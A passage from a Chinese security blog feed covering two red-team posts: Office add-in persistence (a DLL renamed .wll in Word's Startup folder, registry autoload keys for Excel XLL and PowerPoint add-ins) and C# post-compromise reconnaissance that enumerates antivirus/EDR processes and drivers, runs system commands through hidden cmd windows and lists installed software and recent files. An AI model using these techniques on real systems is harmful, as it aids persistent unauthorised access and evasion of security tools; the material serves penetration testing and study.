的信任中心选择禁用加载项，实际上不会禁用WLL，也不会阻止VBA代码执行。</p><h3 id="1）Word-的-WLL-加载项"><a href="#1）Word-的-WLL-加载项" class="headerlink" title="1）Word 的 WLL 加载项"></a>1）Word 的 WLL 加载项</h3><p><code>Word</code> 的三个默认加载项位置如下所示：</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-27_22-32-49.png" alt="Blog_2019-05-27_22-32-49.png"></p><p>对用户位置中的 <code>Startup</code> 进一步调查发现，它是 Word 默认存放<code>全局模板</code>和<code>加载项</code>的文件夹，当启动Word时，程序会自动加载 <code>Startup</code> 文件夹中所有<code>*.dot、*.dotx或*.dotm</code>格式的Word文件，也可以托管拓展名为 <code>* .wll</code> 的文件。而<code>* .wll</code> 文件本质上是一个带有额外<code>特定于Office的扩展的DLL</code>。这意味着<code>* .wll</code> 文件起码可以实现基本的 <code>DLL 功能</code>，我们只需要将<code>*.dll</code> 重命名为 <code>*.wll</code>，放入此文件夹中，可获取当前<code>启动 word 的用户</code>的执行权限。</p><p><em>示例</em>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Run</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">system(<span class="string">"calc"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">DWORD ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">Run();</span><br><span class="line"><span class="comment">// MessageBox(NULL, L"Hello World，I'm RcoIl", L"demo", MB_OK);</span></span><br><span class="line"><span class="comment">// WinExec("calc.exe", SW_SHOWNORMAL);</span></span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这步骤出现了无法加载 <code>wll</code> 问题，所以我直接提问 <a href="https://www.twitter.com/domchell" target="_blank" rel="noopener">Dominic Chell.</a>，他给我的回答是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我在测试的时候也遇到了这样的问题，我认为它是使用了 UI 来弹出东西的，所以建议使用一个简单的 MessageBox 进行测试。并且确保是从 <span class="built_in">attach</span> 当中调用 Run()。</span><br><span class="line"></span><br><span class="line">在使用 MessageBox 时，确保没有使用任何有关系统的东西（避免缺失 DLL），并尝试所有的<span class="built_in">switch</span> cases</span><br></pre></td></tr></table></figure><p>exp 思路就不说了。</p><p>所以我最后使用了上面代码注释行。成功，结果如下。</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-27_22-32-50.gif" alt="Blog_2019-05-27_22-32-50.gif"></p><h3 id="2）Excel-的-XLL-加载项"><a href="#2）Excel-的-XLL-加载项" class="headerlink" title="2）Excel 的 XLL 加载项"></a>2）Excel 的 XLL 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\E</span>xcel<span class="symbol">\O</span>ptions注册表项中添加一个键值</span><br><span class="line">OPEN /R DemoAddin.xll （字符串值）</span><br></pre></td></tr></table></figure><p><code>Excel</code> 启动时，会自动检索 <code>C:\Users(username)\AppData\Roaming\Microsoft\AddIns</code>目录，所以不需要写入绝对路径，默认自动加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">// DemoAddin.xll EXPORTS is xlAutoOpen</span><br></pre></td></tr></table></figure><h3 id="3）PowerPoint-的-VBA-加载项"><a href="#3）PowerPoint-的-VBA-加载项" class="headerlink" title="3）PowerPoint 的 VBA 加载项"></a>3）PowerPoint 的 VBA 加载项</h3><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_CURRENT_USER<span class="symbol">\S</span>oftware<span class="symbol">\M</span>icrosoft<span class="symbol">\O</span>ffice<span class="symbol">\1</span>2.0<span class="symbol">\P</span>owerPoint<span class="symbol">\A</span>ddIns<span class="symbol">\&lt;</span>AddInName&gt;</span><br></pre></td></tr></table></figure><p>文件格式为 <code>*.ppam</code> 或 <code>*.ppa</code>，也是与Excel 一样，放入<code>AddIns</code> 目录中。设置 <code>Autoload</code> 键值为 <strong>1</strong> ，更改PowerPoint 启动时自动加载加载项。</p><p><img src="/image/Microsoft Office - 持久控制（一）/Blog_2019-05-28_12-32-49.png" alt="Blog_2019-05-28_12-32-49"></p><p>关于<code>wll(DLL)</code> 、 <code>xll(dll)</code> 和 <code>ppam(VBA)</code> 的利用，可自行研究。</p><h3 id="4）更多"><a href="#4）更多" class="headerlink" title="4）更多"></a>4）更多</h3><p>更多内容请阅读文章底部的参考文章。</p><h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://attack.mitre.org/techniques/T1137/" target="_blank" rel="noopener">Office Application Startup</a><br><a href="https://enigma0x3.net/2014/01/23/maintaining-access-with-normal-dotm/comment-page-1/" target="_blank" rel="noopener">MAINTAINING ACCESS WITH NORMAL.DOTM</a><br><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener"><a href="http://www.hexacorn.com/blog/2017/04/19/beyond-good-ol-run-key-part-62/" target="_blank" rel="noopener">Beyond good ol’ Run key, Part 62</a></a><br><a href="https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/" target="_blank" rel="noopener">Add-In Opportunities for Office Persistence</a><br><a href="https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-1-microsoft-office/" target="_blank" rel="noopener">Persistence: “the continued or prolonged existence of something”: Part 1 – Microsoft Office</a><br><a href="https://github.com/outflanknl/EvilClippy" target="_blank" rel="noopener">EvilClippy</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是针对&lt;a href=&quot;https://github.com/RcoIl/Mind-Map/blob/master/Windows%E5%B8%B8%E8%A7%81%E6%8C%81%E4%B9%85%E6%8E%A7%E5%88%B6.png&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Windows常见持久控制&lt;/a&gt;的第一次说明。&lt;br&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="权限维持" scheme="https://rcoil.me/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>通过编程实现的本地机器信息收集</title>
    <link href="https://rcoil.me/2019/05/%E9%80%9A%E8%BF%87%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%9C%AC%E5%9C%B0%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>https://rcoil.me/2019/05/通过编程实现的本地机器信息收集/</id>
    <published>2019-05-11T10:52:59.000Z</published>
    <updated>2019-05-31T09:12:55.151Z</updated>
    
    <content type="html"><![CDATA[<p>每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量。<br><a id="more"></a></p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>可选用 <code>bat</code>、<code>C++</code>、<code>C#</code> 进行编写程序，前两者运行无条件限制，后者需要判断 <code>.NET</code> 版本，由于一直是对 <code>C#</code> 较感兴趣，所以使用后者进行编写，也可以直接使用 <code>execute-assembly</code> 执行。</p><p>本文多数模块取之文末的 <code>github</code> 项目。</p><h2 id="0x01-信息收集模块"><a href="#0x01-信息收集模块" class="headerlink" title="0x01 信息收集模块"></a>0x01 信息收集模块</h2><h3 id="1）安全产品检测"><a href="#1）安全产品检测" class="headerlink" title="1）安全产品检测"></a>1）安全产品检测</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">AV_EDR</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**- 获取进程信息</span></span><br><span class="line"><span class="comment">             * - 枚举杀软进程列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/AVQuery.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">           <span class="keyword">string</span>[] avproducts = &#123; <span class="string">"Skynet"</span>,...., <span class="string">"GDScan"</span> &#125;;</span><br><span class="line">            Process[] proces = Process.GetProcesses(Environment.MachineName);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Enumerating EDR products and Antivirus Processes on "</span> + Environment.MachineName + <span class="string">"..."</span>);</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + avproducts.Length + <span class="string">" AV Process Names"</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; proces.Length; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> a = <span class="number">0</span>; a &lt; avproducts.Length; a++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">string</span> processSearch = avproducts[a];</span><br><span class="line">                    <span class="keyword">if</span> (proces[i].ProcessName.Equals(processSearch))</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine(<span class="string">"\t[!] Found AV Process: "</span> + proces[i].ProcessName);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/**- 枚举列表（自定义列表）</span></span><br><span class="line"><span class="comment">             * - 使用 File.Exists 检测文件是否存在</span></span><br><span class="line"><span class="comment">             * - 存在则输出</span></span><br><span class="line"><span class="comment">             * - 代码实现</span></span><br><span class="line"><span class="comment">             * - 参考：https://raw.githubusercontent.com/harleyQu1nn/AggressorScripts/master/EDR.cna</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="keyword">string</span>[] edrproducts = &#123; <span class="string">"CiscoAMPCEFWDriver.sys"</span>,...., <span class="string">"amm6460.sys"</span> &#125;;</span><br><span class="line">            Console.WriteLine(<span class="string">"[+] Loaded "</span> + edrproducts.Length + <span class="string">" EDR Product Names"</span>);</span><br><span class="line">            <span class="keyword">string</span> edrPath = <span class="string">@"C:\Windows\System32\drivers\"</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> e = <span class="number">0</span>; e &lt; edrproducts.Length; e++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (File.Exists(edrPath + edrproducts[e]))</span><br><span class="line">                &#123;</span><br><span class="line">                    Console.WriteLine(<span class="string">"\t[!] EDR driver found "</span> + edrproducts[e]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="2）计算机架构"><a href="#2）计算机架构" class="headerlink" title="2）计算机架构"></a>2）计算机架构</h3><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> Mains()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 直接使用 Environment</span></span><br><span class="line"><span class="comment">             * - 参考：https://docs.microsoft.com/en-us/dotnet/api/system.environment?view=netframework-4.8</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"[+] Environment members "</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 当前机器名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] MachineName: &#123;0&#125;"</span>, Environment.MachineName);</span><br><span class="line">            <span class="comment">// 当前用户名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserName: &#123;0&#125;"</span>, Environment.UserName);</span><br><span class="line">            <span class="comment">// 当前Domain名</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] UserDomainName: &#123;0&#125;"</span>, Environment.UserDomainName);</span><br><span class="line">            <span class="comment">// 当前系统版本</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] OSVersion: &#123;0&#125;"</span>, Environment.OSVersion.ToString());</span><br><span class="line">            <span class="comment">// 当前目录</span></span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] CurrentDirectory: &#123;0&#125;"</span>, Environment.CurrentDirectory);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 盘符</span></span><br><span class="line">            <span class="keyword">string</span>[] drives = Environment.GetLogicalDrives();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetLogicalDrives: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, drives));</span><br><span class="line">            <span class="comment">// 当前程序名</span></span><br><span class="line">            <span class="keyword">string</span>[] arguments = Environment.GetCommandLineArgs();</span><br><span class="line">            <span class="built_in">Console</span>.WriteLine(<span class="string">"\t[*] GetCommandLineArgs: &#123;0&#125;"</span>, <span class="keyword">String</span>.Join(<span class="string">", "</span>, arguments));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="3-文件遍历"><a href="#3-文件遍历" class="headerlink" title="3) 文件遍历"></a>3) 文件遍历</h3><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接利用bat执行就可以</span><br><span class="line"><span class="keyword">FOR</span> /F <span class="string">"Skip=1"</span> %<span class="built_in">%I</span> in ('wmic logicaldisk where <span class="string">"Size&lt;&gt;null"</span> get name') <span class="keyword">Do</span> (%<span class="built_in">%I</span> &amp;&amp; dir /<span class="keyword">s</span> /a %<span class="built_in">%I</span>)</span><br></pre></td></tr></table></figure><h3 id="4-执行命令获取相关"><a href="#4-执行命令获取相关" class="headerlink" title="4) 执行命令获取相关"></a>4) 执行命令获取相关</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 运行基础命令查询</span></span><br><span class="line">        public static void GetBasisInfo()</span><br><span class="line">        &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 获取系统基础信息</span></span><br><span class="line"><span class="comment">            * - 管道没找到好的利用方式</span></span><br><span class="line"><span class="comment">            * - 直接加载系统库，使用 system,此方法有个缺点，需要预分配内存，部分命令无法运行</span></span><br><span class="line"><span class="comment">            * - 最后选择 ProcessStartInfo</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">string</span>[] commands = &#123;</span><br><span class="line">                <span class="string">"systeminfo"</span>,</span><br><span class="line">                <span class="string">"netstat -anop tcp"</span>,</span><br><span class="line">                <span class="string">"ipconfig /all"</span>,</span><br><span class="line">                <span class="string">"tasklist /v"</span>,</span><br><span class="line">                <span class="string">"set"</span>,</span><br><span class="line">                <span class="string">"query user"</span>,</span><br><span class="line">                <span class="string">"net share"</span>,</span><br><span class="line">                <span class="comment">// 自启动的程序</span></span><br><span class="line">                <span class="string">"wmic startup list full"</span>,</span><br><span class="line">                <span class="comment">// 查看分区</span></span><br><span class="line">                <span class="string">"wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size"</span>,</span><br><span class="line">                <span class="comment">// 判断 .NET 版本</span></span><br><span class="line">                <span class="string">"dir %WINDIR%\\Microsoft.NET\\Framework\\v*"</span>,</span><br><span class="line">            &#125;;</span><br><span class="line">            foreach (<span class="keyword">string</span> command in commands)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">string</span> FileName = command.Replace(<span class="string">"/"</span>, <span class="string">""</span>).Replace(<span class="string">"-"</span>, <span class="string">""</span>).Replace(<span class="string">"+"</span>, <span class="string">""</span>).Replace(<span class="string">"%"</span>, <span class="string">""</span>).Replace(<span class="string">","</span>, <span class="string">""</span>).Replace(<span class="string">"="</span>, <span class="string">""</span>).Replace(<span class="string">"*"</span>, <span class="string">""</span>).Replace(<span class="string">"\\"</span>, <span class="string">""</span>);</span><br><span class="line">                ProcessStartInfo proccessStartInfo = <span class="keyword">new</span> ProcessStartInfo(<span class="string">"cmd.exe"</span>, <span class="string">" /c "</span> + command);</span><br><span class="line">                proccessStartInfo.CreateNoWindow = true;</span><br><span class="line">                Process <span class="function"><span class="keyword">proc</span> = <span class="title">new</span> <span class="title">Process</span> &#123; <span class="title">StartInfo</span> = <span class="title">proccessStartInfo</span> &#125;</span>;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">RedirectStandardOutput</span> = <span class="title">true</span></span>; <span class="comment">// 由调用程序获取输出信息</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">UseShellExecute</span> = <span class="title">false</span></span>; <span class="comment">// 是否使用操作系统shell启动</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">StartInfo</span>.<span class="title">CreateNoWindow</span> = <span class="title">true</span></span>; <span class="comment">// 不显示程序窗口</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Start</span><span class="params">()</span></span>; <span class="comment">// 启动程序</span></span><br><span class="line">                <span class="keyword">string</span> outlist = <span class="function"><span class="keyword">proc</span>.<span class="title">StandardOutput</span>.<span class="title">ReadToEnd</span><span class="params">()</span></span>;</span><br><span class="line">                TxtWriter(outlist, FileName);</span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">WaitForExit</span><span class="params">()</span></span>; <span class="comment">// 等待程序执行完退出进程</span></span><br><span class="line">                <span class="function"><span class="keyword">proc</span>.<span class="title">Close</span><span class="params">()</span></span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="5-程序安装及版本"><a href="#5-程序安装及版本" class="headerlink" title="5) 程序安装及版本"></a>5) 程序安装及版本</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找安装程序及版本</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">GetInstalledApplications</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 从注册 Uninstall 表项中提取相关信息，进行筛选</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> basekey = <span class="string">"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall"</span>;</span><br><span class="line">            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123; <span class="comment">// This key exists</span></span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"DisplayName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> displayversion = (installedapp.GetValue(<span class="string">"DisplayVersion"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"DisplayVersion"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">string</span> helplink = (installedapp.GetValue(<span class="string">"HelpLink"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"HelpLink"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!(Regex.IsMatch(displayname, <span class="string">"^(Service Pack \\d+|(Definition\\s|Security\\s)?Update) for"</span>) &amp;&amp; Regex.IsMatch(helplink, <span class="string">"support\\.microsoft"</span>)) &amp;&amp; displayname != <span class="string">""</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">if</span> (displayversion != <span class="string">""</span>)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname + " (" + displayversion + ")");</span></span><br><span class="line">                                <span class="keyword">string</span> displaynameversion = displayname + <span class="string">" ("</span> + displayversion + <span class="string">")"</span>;</span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">else</span></span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                                TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;                 </span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            basekey = <span class="string">"Software\\Microsoft\\Installer\\Products"</span>;</span><br><span class="line">            registryKey = Registry.CurrentUser.OpenSubKey(basekey);</span><br><span class="line">            <span class="keyword">if</span> (registryKey != <span class="literal">null</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="keyword">string</span> rname <span class="keyword">in</span> registryKey.GetSubKeyNames())</span><br><span class="line">                &#123;</span><br><span class="line">                    RegistryKey installedapp = registryKey.OpenSubKey(rname);</span><br><span class="line">                    <span class="keyword">if</span> (installedapp != <span class="literal">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">string</span> displayname = (installedapp.GetValue(<span class="string">"ProductName"</span>) != <span class="literal">null</span>) ? installedapp.GetValue(<span class="string">"ProductName"</span>).ToString() : <span class="string">""</span>;</span><br><span class="line">                        <span class="keyword">if</span> (displayname != <span class="string">""</span>)</span><br><span class="line">                            <span class="comment">//Console.Out.WriteLine("\t[*] " + displayname);</span></span><br><span class="line">                            TxtWriter(displayname, <span class="string">"查找安装程序及版本"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h3 id="6-最近浏览的文件"><a href="#6-最近浏览的文件" class="headerlink" title="6) 最近浏览的文件"></a>6) 最近浏览的文件</h3><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Recent</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * - 最近预览的文件</span></span><br><span class="line"><span class="comment">             * - 在 Tools 有朋友发过类似的 bat 脚本，实现原理是遍历用户目录下的lnk和url文件，然后调用vbs脚本获取快捷方式所指向的文件或者网址</span></span><br><span class="line"><span class="comment">             * - 参考：https://www.t00ls.net/articles-46152.html</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">string</span> userPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);</span><br><span class="line">            <span class="keyword">string</span> recents = <span class="string">@"Microsoft\Windows\Recent"</span>;</span><br><span class="line">            <span 